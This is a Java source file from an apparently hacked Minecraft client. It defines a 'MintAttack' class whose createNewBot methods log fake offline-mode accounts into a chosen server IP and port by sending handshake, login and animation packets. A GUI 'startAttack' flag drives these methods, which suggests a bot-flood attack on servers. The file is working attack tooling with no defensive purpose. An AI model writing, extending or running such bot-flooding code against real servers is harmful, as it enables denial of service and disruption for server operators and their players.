package epsilon.botting;

import java.net.InetAddress;
import java.net.UnknownHostException;

import net.minecraft.client.Minecraft;
import net.minecraft.network.EnumConnectionState;
import net.minecraft.network.NetworkManager;
import net.minecraft.network.handshake.client.C00Handshake;
import net.minecraft.network.login.client.C00PacketLoginStart;
import net.minecraft.network.play.client.C0APacketAnimation;
import net.minecraft.util.Session;

public class MintAttack{

	final static private Minecraft mc = Minecraft.getMinecraft();
	
	public static void createNewBot(final String genCrackedAlt, final boolean live, final String message, final int port, final String ip) {
		final Session session = new Session(genCrackedAlt, "", "", "");
		
		NetworkManager networkManager;
		InetAddress connect;
		try {
			connect = InetAddress.getByName(ip);
		} catch (UnknownHostException e) {
			e.printStackTrace();
			return;
		}
        networkManager = NetworkManager.provideLanClientOptimized(connect, port);
        networkManager.sendPacket(new C00Handshake(47, ip, port, EnumConnectionState.LOGIN));
        networkManager.sendPacket(new C00PacketLoginStart(session.getProfile()));

        networkManager.checkDisconnected();
	}

	public static void createNewBot(String genCrackedAlt, boolean live, String message, String port, String ip) {

		final Session session = new Session(genCrackedAlt, "", "", "");
		
		NetworkManager networkManager;
		InetAddress connect;
		int portk = Integer.parseInt(port);
		try {
			connect = InetAddress.getByName(ip);
		} catch (UnknownHostException e) {
			e.printStackTrace();
			if(MintAttackGUI.startAttack)
			MintAttackGUI.startAttack = false;
			return;
		}
        networkManager = NetworkManager.provideLanClientOptimized(connect, portk);
        networkManager.sendPacket(new C00Handshake(47, ip, portk, EnumConnectionState.LOGIN));
        networkManager.sendPacket(new C00PacketLoginStart(session.getProfile()));

        networkManager.checkDisconnected();
		
	}

	public static void createNewBot(String genCrackedAlt, boolean b, String string, String port, String ip, boolean c) {

		final Session session = new Session(genCrackedAlt, "", "", "");
		
		final NetworkManager networkManager;
		final InetAddress connect;
		final int portk = Integer.parseInt(port);
		try {
			connect = InetAddress.getByName(ip);
		} catch (UnknownHostException e) {
			e.printStackTrace();
			if(MintAttackGUI.startAttack)
			MintAttackGUI.startAttack = false;
			return;
		}
        networkManager = NetworkManager.provideLanClientOptimized(connect, portk);
        networkManager.sendPacket(new C00Handshake(47, ip, portk, EnumConnectionState.LOGIN));
        networkManager.sendPacket(new C00PacketLoginStart(session.getProfile()));
        networkManager.sendPacket(new C0APacketAnimation());
        networkManager.checkDisconnected();
		
	}

}
